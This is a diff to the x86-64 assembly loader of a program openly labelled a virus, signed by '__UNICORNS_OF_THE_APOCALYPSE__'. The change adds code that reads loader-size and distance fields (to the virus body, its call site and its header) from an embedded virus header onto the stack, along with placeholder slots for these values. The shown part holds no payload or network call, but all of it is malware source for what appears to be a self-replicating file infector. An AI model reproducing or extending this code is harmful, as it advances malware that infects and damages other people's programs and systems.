@@ -29,6 +29,23 @@ loader_entry:
 
 ; space for structure fields
 	sub rsp, end_virus_header - virus_header_struct
+
+; dist_header_loader
+	lea r11, [rel virus_header_struct + 0x30]
+	mov r11, [r11]
+	mov [rsp + 0x30], r11
+; dist_vircall_loader
+	lea r11, [rel virus_header_struct + 0x28]
+	mov r11, [r11]
+	mov [rsp + 0x28], r11
+; dist_virus_loader
+	lea r11, [rel virus_header_struct + 0x20]
+	mov r11, [r11]
+	mov [rsp + 0x20], r11
+; loader_size
+	lea r11, [rel virus_header_struct + 0x18]
+	mov r11, [r11]
+	mov [rsp + 0x18], r11
 ; loader_entry
 	lea r8, [rel loader_entry]
 	mov [rsp + 0x10], r8
@@ -72,5 +89,9 @@ virus_header_struct:
 	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
 	dq loader_entry                                   ; virus size (placeholder)
 	dq loader_entry                                   ; loader entry (placeholder)
+	dq loader_entry                                   ; loader_size
+	dq loader_entry                                   ; dist_virus_loader
+	dq loader_entry                                   ; dist_vircall_loader
+	dq loader_entry                                   ; dist_header_loader
 end_virus_header:
 	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
